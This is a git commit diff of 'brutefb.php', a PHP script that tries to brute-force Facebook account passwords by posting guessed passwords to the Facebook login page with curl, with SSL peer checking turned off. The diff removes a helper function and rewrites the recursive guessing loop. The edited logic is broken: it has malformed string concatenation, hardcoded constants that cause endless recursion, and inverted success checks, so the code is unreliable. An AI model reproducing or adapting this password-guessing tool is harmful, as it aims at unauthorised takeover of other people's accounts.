57be131845e1a98945df08094d888f651bf7aba3
x0rLS <42499784+x0rLS@users.noreply.github.com>
2018-10-13 13:53:24 +0200

    Update brutefb.php

--- brutefb.php
+++ brutefb.php
@@ -9,24 +9,7 @@ define('P_MAX_LEN', 12);
 $Pass = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%&*';          /*character set which is used to brute force the password*/
 $c_len = strlen($Pass); 
 
-function check_correct($Pass)
-{
-        $c = curl_init('https://www.facebook.com/login');
-        curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
-        curl_setopt($c, CURLOPT_POST, 1);
-        curl_setopt($c, CURLOPT_POSTFIELDS, "email='.$username.'&pass='.$Pass.'");
-        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); // We need to fetch something from a string, so no direct output!
-        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1); // we get redirected, so follow
-        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 2);
-        curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
-        $str = curl_exec($c); // Get it
-        curl_close($c);
-        if($str != "What's on your mind?") {return true;}
-        else {return false;}
-}
-
-function repeat($width, $position)
+function bruteForce($width, $position)
 {     
 	
         $c = curl_init('https://www.facebook.com/login');
@@ -39,15 +22,13 @@ function repeat($width, $position)
         curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 2);
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
         $str = curl_exec($c); // Get it
-        curl_close($c);
-	
-	global $Pass, $c_len; 
+        curl_close($c); 
 		
 	for ($i = 1; $i < 12; $i++) 
 	{        
-		if ($position  < $width - 1) 
+		if (1 < 12 - 1) 
 		{    
-			repeat($width, $position + 1, $Pass[$i]); 
+			bruteForce(1, 12 + 1, $Pass[$i]); 
 		}
 		     
 			if($str != "What's on your mind?") {echo "Password:".$Pass[$i]."";}
